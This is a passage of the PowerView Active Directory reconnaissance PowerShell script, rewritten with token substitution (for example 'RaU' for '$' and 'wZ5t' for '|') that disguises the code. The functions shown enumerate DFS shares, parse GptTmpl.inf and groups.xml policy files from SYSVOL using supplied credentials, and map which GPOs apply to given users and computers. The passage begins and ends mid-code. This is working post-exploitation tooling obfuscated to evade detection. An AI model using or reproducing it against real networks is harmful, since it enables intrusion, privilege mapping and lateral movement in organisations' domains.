                            RaUtarget_entry_size = [bitconverter]::ToUInt32(RaUdfs_targetlist_blob[RaUtarget_entry_size_start..RaUtarget_entry_size_end],0)
                            RaUtarget_time_stamp_start = RaUtarget_entry_size_end + 1
                            RaUtarget_time_stamp_end = RaUtarget_time_stamp_start + 7
                            # FILETIME again or special if priority rank and priority class 0
                            RaUtarget_time_stamp = RaUdfs_targetlist_blob[RaUtarget_time_stamp_start..RaUtarget_time_stamp_end]
                            RaUtarget_state_start = RaUtarget_time_stamp_end + 1
                            RaUtarget_state_end = RaUtarget_state_start + 3
                            RaUtarget_state = [bitconverter]::ToUInt32(RaUdfs_targetlist_blob[RaUtarget_state_start..RaUtarget_state_end],0)

                            RaUtarget_type_start = RaUtarget_state_end + 1
                            RaUtarget_type_end = RaUtarget_type_start + 3
                            RaUtarget_type = [bitconverter]::ToUInt32(RaUdfs_targetlist_blob[RaUtarget_type_start..RaUtarget_type_end],0)

                            RaUserver_name_size_start = RaUtarget_type_end + 1
                            RaUserver_name_size_end = RaUserver_name_size_start + 1
                            RaUserver_name_size = [bitconverter]::ToUInt16(RaUdfs_targetlist_blob[RaUserver_name_size_start..RaUserver_name_size_end],0)

                            RaUserver_name_start = RaUserver_name_size_end + 1
                            RaUserver_name_end = RaUserver_name_start + RaUserver_name_size - 1
                            RaUserver_name = [System.Text.Encoding]::Unicode.GetString(RaUdfs_targetlist_blob[RaUserver_name_start..RaUserver_name_end])

                            RaUshare_name_size_start = RaUserver_name_end + 1
                            RaUshare_name_size_end = RaUshare_name_size_start + 1
                            RaUshare_name_size = [bitconverter]::ToUInt16(RaUdfs_targetlist_blob[RaUshare_name_size_start..RaUshare_name_size_end],0)
                            RaUshare_name_start = RaUshare_name_size_end + 1
                            RaUshare_name_end = RaUshare_name_start + RaUshare_name_size - 1
                            RaUshare_name = [System.Text.Encoding]::Unicode.GetString(RaUdfs_targetlist_blob[RaUshare_name_start..RaUshare_name_end])

                            RaUtarget_list += Oj8XScKjScKjRaUserver_nameScKjRaUshare_nameOj8X
                            RaUt_offset = RaUshare_name_end + 1
                        }
                    }
                }
                RaUoffset = RaUblob_data_end + 1
                RaUdfs_pkt_properties = @{
                    q4gUNameq4gU = RaUblob_name
                    q4gUPrefixq4gU = RaUprefix
                    q4gUTargetListq4gU = RaUtarget_list
                }
                RaUobject_list += New-Object -TypeName PSObject -Property RaUdfs_pkt_properties
                RaUprefix = RaUNull
                RaUblob_name = RaUNull
                RaUtarget_list = RaUNull
            }

            RaUservers = @()
            RaUobject_list wZ5t ForEach-Object {
                if (RaU_.TargetList) {
                    RaU_.TargetList wZ5t ForEach-Object {
                        RaUservers += RaU_.split(q4gUScKjq4gU)[2]
                    }
                }
            }

            RaUservers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                RaUDomain,

                [String]
                RaUSearchBase,

                [String]
                RaUServer,

                [String]
                RaUSearchScope = q4gUSubtreeq4gU,

                [Int]
                RaUResultPageSize = 200,

                [Int]
                RaUServerTimeLimit,

                [Switch]
                RaUTombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                RaUCredential = [Management.Automation.PSCredential]::Empty
            )

            RaUDFSsearcher = Get-DomainSearcher @PSBoundParameters

            if (RaUDFSsearcher) {
                RaUDFSshares = @()
                RaUDFSsearcher.filter = q4gU(&(objectClass=fTDfs))q4gU

                try {
                    RaUResults = RaUDFSSearcher.FindAll()
                    RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                        RaUProperties = RaU_.Properties
                        RaURemoteNames = RaUProperties.remoteservername
                        RaUPkt = RaUProperties.pkt

                        RaUDFSshares += RaURemoteNames wZ5t ForEach-Object {
                            try {
                                if ( RaU_.Contains(q4gUScKjq4gU) ) {
                                    New-Object -TypeName PSObject -Property @{q4gUNameq4gU=RaUProperties.name[0];q4gURemoteServerNameq4gU=RaU_.split(q4gUScKjq4gU)[2]}
                                }
                            }
                            catch {
                                Write-Verbose Oj8X[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : RaU_Oj8X
                            }
                        }
                    }
                    if (RaUResults) {
                        try { RaUResults.dispose() }
                        catch {
                            Write-Verbose Oj8X[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: RaU_Oj8X
                        }
                    }
                    RaUDFSSearcher.dispose()

                    if (RaUpkt -and RaUpkt[0]) {
                        Parse-Pkt RaUpkt[0] wZ5t ForEach-Object {
                            # If a folder doesnq4gUt have a redirection it will have a target like
                            # ScKjScKjnullScKjTestNameSpaceScKjfolderScKj.DFSFolderLink so we do actually want to match
                            # on q4gUnullq4gU rather than RaUNull
                            if (RaU_ -ne q4gUnullq4gU) {
                                New-Object -TypeName PSObject -Property @{q4gUNameq4gU=RaUProperties.name[0];q4gURemoteServerNameq4gU=RaU_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning Oj8X[Get-DomainDFSShare] Get-DomainDFSShareV1 error : RaU_Oj8X
                }
                RaUDFSshares wZ5t Sort-Object -Unique -Property q4gURemoteServerNameq4gU
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                RaUDomain,

                [String]
                RaUSearchBase,

                [String]
                RaUServer,

                [String]
                RaUSearchScope = q4gUSubtreeq4gU,

                [Int]
                RaUResultPageSize = 200,

                [Int]
                RaUServerTimeLimit,

                [Switch]
                RaUTombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                RaUCredential = [Management.Automation.PSCredential]::Empty
            )

            RaUDFSsearcher = Get-DomainSearcher @PSBoundParameters

            if (RaUDFSsearcher) {
                RaUDFSshares = @()
                RaUDFSsearcher.filter = q4gU(&(objectClass=msDFS-Linkv2))q4gU
                RaUNull = RaUDFSSearcher.PropertiesToLoad.AddRange((q4gUmsdfs-linkpathv2q4gU,q4gUmsDFS-TargetListv2q4gU))

                try {
                    RaUResults = RaUDFSSearcher.FindAll()
                    RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                        RaUProperties = RaU_.Properties
                        RaUtarget_list = RaUProperties.q4gUmsdfs-targetlistv2q4gU[0]
                        RaUxml = [xml][System.Text.Encoding]::Unicode.GetString(RaUtarget_list[2..(RaUtarget_list.Length-1)])
                        RaUDFSshares += RaUxml.targets.ChildNodes wZ5t ForEach-Object {
                            try {
                                RaUTarget = RaU_.InnerText
                                if ( RaUTarget.Contains(q4gUScKjq4gU) ) {
                                    RaUDFSroot = RaUTarget.split(q4gUScKjq4gU)[3]
                                    RaUShareName = RaUProperties.q4gUmsdfs-linkpathv2q4gU[0]
                                    New-Object -TypeName PSObject -Property @{q4gUNameq4gU=Oj8XRaUDFSrootRaUShareNameOj8X;q4gURemoteServerNameq4gU=RaUTarget.split(q4gUScKjq4gU)[2]}
                                }
                            }
                            catch {
                                Write-Verbose Oj8X[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : RaU_Oj8X
                            }
                        }
                    }
                    if (RaUResults) {
                        try { RaUResults.dispose() }
                        catch {
                            Write-Verbose Oj8X[Get-DomainDFSShare] Error disposing of the Results object: RaU_Oj8X
                        }
                    }
                    RaUDFSSearcher.dispose()
                }
                catch {
                    Write-Warning Oj8X[Get-DomainDFSShare] Get-DomainDFSShareV2 error : RaU_Oj8X
                }
                RaUDFSshares wZ5t Sort-Object -Unique -Property q4gURemoteServerNameq4gU
            }
        }
    }

    PROCESS {
        RaUDFSshares = @()

        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            ForEach (RaUTargetDomain in RaUDomain) {
                RaUSearcherArguments[q4gUDomainq4gU] = RaUTargetDomain
                if (RaUVersion -match q4gUallwZ5t1q4gU) {
                    RaUDFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if (RaUVersion -match q4gUallwZ5t2q4gU) {
                    RaUDFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if (RaUVersion -match q4gUallwZ5t1q4gU) {
                RaUDFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if (RaUVersion -match q4gUallwZ5t2q4gU) {
                RaUDFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        RaUDFSshares wZ5t Sort-Object -Property (q4gURemoteServerNameq4gU,q4gUNameq4gU) -Unique
    }
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
.SYNOPSIS

Helper to parse a GptTmpl.inf policy file path into a hashtable.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  

.DESCRIPTION

Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
GPO object is passed, GPOPATHScKjMACHINEScKjMicrosoftScKjWindows NTScKjSecEditScKjGptTmpl.inf
is constructed and assumed to be the parse target. If -Credential is passed,
Add-RemoteConnection is used to mount ScKjScKjTARGETScKjSYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GptTmplPath

Specifies the GptTmpl.inf file path name to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-GptTmpl -GptTmplPath Oj8XScKjScKjdev.testlab.localScKjsysvolScKjdev.testlab.localScKjPoliciesScKj{31B2F340-016D-11D2-945F-00C04FB984F9}ScKjMACHINEScKjMicrosoftScKjWindows NTScKjSecEditScKjGptTmpl.infOj8X

Parse the default domain policy .inf for dev.testlab.local

.EXAMPLE

Get-DomainGPO testing wZ5t Get-GptTmpl

Parse the GptTmpl.inf policy for the GPO with display name of q4gUtestingq4gU.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-GptTmpl -Credential RaUCred -GptTmplPath Oj8XScKjScKjdev.testlab.localScKjsysvolScKjdev.testlab.localScKjPoliciesScKj{31B2F340-016D-11D2-945F-00C04FB984F9}ScKjMACHINEScKjMicrosoftScKjWindows NTScKjSecEditScKjGptTmpl.infOj8X

Parse the default domain policy .inf for dev.testlab.local using alternate credentials.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUgpcfilesyspathq4gU, q4gUPathq4gU)]
        [String]
        RaUGptTmplPath,

        [Switch]
        RaUOutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUMappedPaths = @{}
    }

    PROCESS {
        try {
            if ((RaUGptTmplPath -Match q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU) -and (RaUPSBoundParameters[q4gUCredentialq4gU])) {
                RaUSysVolPath = Oj8XScKjScKjRaU((New-Object System.Uri(RaUGptTmplPath)).Host)ScKjSYSVOLOj8X
                if (-not RaUMappedPaths[RaUSysVolPath]) {
                    # map IPCRaU to this computer if itq4gUs not already
                    Add-RemoteConnection -Path RaUSysVolPath -Credential RaUCredential
                    RaUMappedPaths[RaUSysVolPath] = RaUTrue
                }
            }

            RaUTargetGptTmplPath = RaUGptTmplPath
            if (-not RaUTargetGptTmplPath.EndsWith(q4gU.infq4gU)) {
                RaUTargetGptTmplPath += q4gUScKjMACHINEScKjMicrosoftScKjWindows NTScKjSecEditScKjGptTmpl.infq4gU
            }

            Write-Verbose Oj8X[Get-GptTmpl] Parsing GptTmplPath: RaUTargetGptTmplPathOj8X

            if (RaUPSBoundParameters[q4gUOutputObjectq4gU]) {
                RaUContents = Get-IniContent -Path RaUTargetGptTmplPath -OutputObject -ErrorAction Stop
                if (RaUContents) {
                    RaUContents wZ5t Add-Member Noteproperty q4gUPathq4gU RaUTargetGptTmplPath
                    RaUContents
                }
            }
            else {
                RaUContents = Get-IniContent -Path RaUTargetGptTmplPath -ErrorAction Stop
                if (RaUContents) {
                    RaUContents[q4gUPathq4gU] = RaUTargetGptTmplPath
                    RaUContents
                }
            }
        }
        catch {
            Write-Verbose Oj8X[Get-GptTmpl] Error parsing RaUTargetGptTmplPath : RaU_Oj8X
        }
    }

    END {
        # remove the SYSVOL mappings
        RaUMappedPaths.Keys wZ5t ForEach-Object { Remove-RemoteConnection -Path RaU_ }
    }
}


function Get-GroupsXML {
<#
.SYNOPSIS

Helper to parse a groups.xml file path into a custom object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  

.DESCRIPTION

Parses a groups.xml into a custom object. If -Credential is passed,
Add-RemoteConnection is used to mount ScKjScKjTARGETScKjSYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GroupsXMLpath

Specifies the groups.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.OUTPUTS

PowerView.GroupsXML
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.GroupsXMLq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUPathq4gU)]
        [String]
        RaUGroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUMappedPaths = @{}
    }

    PROCESS {
        try {
            if ((RaUGroupsXMLPath -Match q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU) -and (RaUPSBoundParameters[q4gUCredentialq4gU])) {
                RaUSysVolPath = Oj8XScKjScKjRaU((New-Object System.Uri(RaUGroupsXMLPath)).Host)ScKjSYSVOLOj8X
                if (-not RaUMappedPaths[RaUSysVolPath]) {
                    # map IPCRaU to this computer if itq4gUs not already
                    Add-RemoteConnection -Path RaUSysVolPath -Credential RaUCredential
                    RaUMappedPaths[RaUSysVolPath] = RaUTrue
                }
            }

            [XML]RaUGroupsXMLcontent = Get-Content -Path RaUGroupsXMLPath -ErrorAction Stop

            # process all group properties in the XML
            RaUGroupsXMLcontent wZ5t Select-Xml Oj8X/Groups/GroupOj8X wZ5t Select-Object -ExpandProperty node wZ5t ForEach-Object {

                RaUGroupname = RaU_.Properties.groupName

                # extract the localgroup sid for memberof
                RaUGroupSID = RaU_.Properties.groupSid
                if (-not RaUGroupSID) {
                    if (RaUGroupname -match q4gUAdministratorsq4gU) {
                        RaUGroupSID = q4gUS-1-5-32-544q4gU
                    }
                    elseif (RaUGroupname -match q4gURemote Desktopq4gU) {
                        RaUGroupSID = q4gUS-1-5-32-555q4gU
                    }
                    elseif (RaUGroupname -match q4gUGuestsq4gU) {
                        RaUGroupSID = q4gUS-1-5-32-546q4gU
                    }
                    else {
                        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                            RaUGroupSID = ConvertTo-SID -ObjectName RaUGroupname -Credential RaUCredential
                        }
                        else {
                            RaUGroupSID = ConvertTo-SID -ObjectName RaUGroupname
                        }
                    }
                }

                # extract out members added to this group
                RaUMembers = RaU_.Properties.members wZ5t Select-Object -ExpandProperty Member wZ5t Where-Object { RaU_.action -match q4gUADDq4gU } wZ5t ForEach-Object {
                    if (RaU_.sid) { RaU_.sid }
                    else { RaU_.name }
                }

                if (RaUMembers) {
                    # extract out any/all filters...I hate you GPP
                    if (RaU_.filters) {
                        RaUFilters = RaU_.filters.GetEnumerator() wZ5t ForEach-Object {
                            New-Object -TypeName PSObject -Property @{q4gUTypeq4gU = RaU_.LocalName;q4gUValueq4gU = RaU_.name}
                        }
                    }
                    else {
                        RaUFilters = RaUNull
                    }

                    if (RaUMembers -isnot [System.Array]) { RaUMembers = @(RaUMembers) }

                    RaUGroupsXML = New-Object PSObject
                    RaUGroupsXML wZ5t Add-Member Noteproperty q4gUGPOPathq4gU RaUTargetGroupsXMLPath
                    RaUGroupsXML wZ5t Add-Member Noteproperty q4gUFiltersq4gU RaUFilters
                    RaUGroupsXML wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupName
                    RaUGroupsXML wZ5t Add-Member Noteproperty q4gUGroupSIDq4gU RaUGroupSID
                    RaUGroupsXML wZ5t Add-Member Noteproperty q4gUGroupMemberOfq4gU RaUNull
                    RaUGroupsXML wZ5t Add-Member Noteproperty q4gUGroupMembersq4gU RaUMembers
                    RaUGroupsXML.PSObject.TypeNames.Insert(0, q4gUPowerView.GroupsXMLq4gU)
                    RaUGroupsXML
                }
            }
        }
        catch {
            Write-Verbose Oj8X[Get-GroupsXML] Error parsing RaUTargetGroupsXMLPath : RaU_Oj8X
        }
    }

    END {
        # remove the SYSVOL mappings
        RaUMappedPaths.Keys wZ5t ForEach-Object { Remove-RemoteConnection -Path RaU_ }
    }
}


function Get-DomainGPO {
<#
.SYNOPSIS

Return all GPOs or specific GPO objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties samaccountname,usnchanged,...Oj8X. By default, all GPO objects for
the current domain are returned. To enumerate all GPOs that are applied to
a particular machine, use -ComputerName X.

.PARAMETER Identity

A display name (e.g. q4gUTest GPOq4gU), DistinguishedName (e.g. q4gUCN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=localq4gU),
GUID (e.g. q4gU10ec320d-3111-4ef4-8faf-8f14f4adc789q4gU), or GPO name (e.g. q4gU{F260B76D-55C8-46C5-BEF1-9016DD98E272}q4gU). Wildcards accepted.

.PARAMETER ComputerIdentity

Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).

.PARAMETER UserIdentity

Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGPO -Domain testlab.local

Return all GPOs for the testlab.local domain

.EXAMPLE

Get-DomainGPO -ComputerName windows1.testlab.local

Returns all GPOs applied windows1.testlab.local

.EXAMPLE

Oj8X{F260B76D-55C8-46C5-BEF1-9016DD98E272}Oj8X,Oj8XTest GPOOj8X wZ5t Get-DomainGPO

Return the GPOs with the name of Oj8X{F260B76D-55C8-46C5-BEF1-9016DD98E272}Oj8X and the display
name of Oj8XTest GPOOj8X

.EXAMPLE

Get-DomainGPO -LDAPFilter q4gU(!primarygroupid=513)q4gU -Properties samaccountname,lastlogon

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainGPO -Credential RaUCred

.OUTPUTS

PowerView.GPO

Custom PSObject with translated GPO property fields.

PowerView.GPO.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.GPOq4gU)]
    [OutputType(q4gUPowerView.GPO.Rawq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUNoneq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [Parameter(ParameterSetName = q4gUComputerIdentityq4gU)]
        [Alias(q4gUComputerNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerIdentity,

        [Parameter(ParameterSetName = q4gUUserIdentityq4gU)]
        [Alias(q4gUUserNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUGPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (RaUGPOSearcher) {
            if (RaUPSBoundParameters[q4gUComputerIdentityq4gU] -or RaUPSBoundParameters[q4gUUserIdentityq4gU]) {
                RaUGPOAdsPaths = @()
                if (RaUSearcherArguments[q4gUPropertiesq4gU]) {
                    RaUOldProperties = RaUSearcherArguments[q4gUPropertiesq4gU]
                }
                RaUSearcherArguments[q4gUPropertiesq4gU] = q4gUdistinguishedname,dnshostnameq4gU
                RaUTargetComputerName = RaUNull

                if (RaUPSBoundParameters[q4gUComputerIdentityq4gU]) {
                    RaUSearcherArguments[q4gUIdentityq4gU] = RaUComputerIdentity
                    RaUComputer = Get-DomainComputer @SearcherArguments -FindOne wZ5t Select-Object -First 1
                    if(-not RaUComputer) {
                        Write-Verbose Oj8X[Get-DomainGPO] Computer q4gURaUComputerIdentityq4gU not found!Oj8X
                    }
                    RaUObjectDN = RaUComputer.distinguishedname
                    RaUTargetComputerName = RaUComputer.dnshostname
                }
                else {
                    RaUSearcherArguments[q4gUIdentityq4gU] = RaUUserIdentity
                    RaUUser = Get-DomainUser @SearcherArguments -FindOne wZ5t Select-Object -First 1
                    if(-not RaUUser) {
                        Write-Verbose Oj8X[Get-DomainGPO] User q4gURaUUserIdentityq4gU not found!Oj8X
                    }
                    RaUObjectDN = RaUUser.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                RaUObjectOUs = @()
                RaUObjectOUs += RaUObjectDN.split(q4gU,q4gU) wZ5t ForEach-Object {
                    if(RaU_.startswith(q4gUOU=q4gU)) {
                        RaUObjectDN.SubString(RaUObjectDN.IndexOf(Oj8XRaU(RaU_),Oj8X))
                    }
                }
                Write-Verbose Oj8X[Get-DomainGPO] object OUs: RaUObjectOUsOj8X

                if (RaUObjectOUs) {
                    # find all the GPOs linked to the user/computerq4gUs OUs
                    RaUSearcherArguments.Remove(q4gUPropertiesq4gU)
                    RaUInheritanceDisabled = RaUFalse
                    ForEach(RaUObjectOU in RaUObjectOUs) {
                        RaUSearcherArguments[q4gUIdentityq4gU] = RaUObjectOU
                        RaUGPOAdsPaths += Get-DomainOU @SearcherArguments wZ5t ForEach-Object {
                            # extract any GPO links for this particular OU the computer is a part of
                            if (RaU_.gplink) {
                                RaU_.gplink.split(q4gU][q4gU) wZ5t ForEach-Object {
                                    if (RaU_.startswith(q4gULDAPq4gU)) {
                                        RaUParts = RaU_.split(q4gU;q4gU)
                                        RaUGpoDN = RaUParts[0]
                                        RaUEnforced = RaUParts[1]

                                        if (RaUInheritanceDisabled) {
                                            # if inheritance has already been disabled and this GPO is set as Oj8XenforcedOj8X
                                            #   then add it, otherwise ignore it
                                            if (RaUEnforced -eq 2) {
                                                RaUGpoDN
                                            }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            RaUGpoDN
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs arenq4gUt processed
                            if (RaU_.gpoptions -eq 1) {
                                RaUInheritanceDisabled = RaUTrue
                            }
                        }
                    }
                }

                if (RaUTargetComputerName) {
                    # find all the GPOs linked to the computerq4gUs site
                    RaUComputerSite = (Get-NetComputerSiteName -ComputerName RaUTargetComputerName).SiteName
                    if(RaUComputerSite -and (RaUComputerSite -notlike q4gUError*q4gU)) {
                        RaUSearcherArguments[q4gUIdentityq4gU] = RaUComputerSite
                        RaUGPOAdsPaths += Get-DomainSite @SearcherArguments wZ5t ForEach-Object {
                            if(RaU_.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                RaU_.gplink.split(q4gU][q4gU) wZ5t ForEach-Object {
                                    if (RaU_.startswith(q4gULDAPq4gU)) {
                                        RaU_.split(q4gU;q4gU)[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computerq4gUs domain
                RaUObjectDomainDN = RaUObjectDN.SubString(RaUObjectDN.IndexOf(q4gUDC=q4gU))
                RaUSearcherArguments.Remove(q4gUIdentityq4gU)
                RaUSearcherArguments.Remove(q4gUPropertiesq4gU)
                RaUSearcherArguments[q4gULDAPFilterq4gU] = Oj8X(objectclass=domain)(distinguishedname=RaUObjectDomainDN)Oj8X
                RaUGPOAdsPaths += Get-DomainObject @SearcherArguments wZ5t ForEach-Object {
                    if(RaU_.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        RaU_.gplink.split(q4gU][q4gU) wZ5t ForEach-Object {
                            if (RaU_.startswith(q4gULDAPq4gU)) {
                                RaU_.split(q4gU;q4gU)[0]
                            }
                        }
                    }
                }
                Write-Verbose Oj8X[Get-DomainGPO] GPOAdsPaths: RaUGPOAdsPathsOj8X

                # restore the old properites to return, if set
                if (RaUOldProperties) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUOldProperties }
                else { RaUSearcherArguments.Remove(q4gUPropertiesq4gU) }
                RaUSearcherArguments.Remove(q4gUIdentityq4gU)

                RaUGPOAdsPaths wZ5t Where-Object {RaU_ -and (RaU_ -ne q4gUq4gU)} wZ5t ForEach-Object {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    RaUSearcherArguments[q4gUSearchBaseq4gU] = RaU_
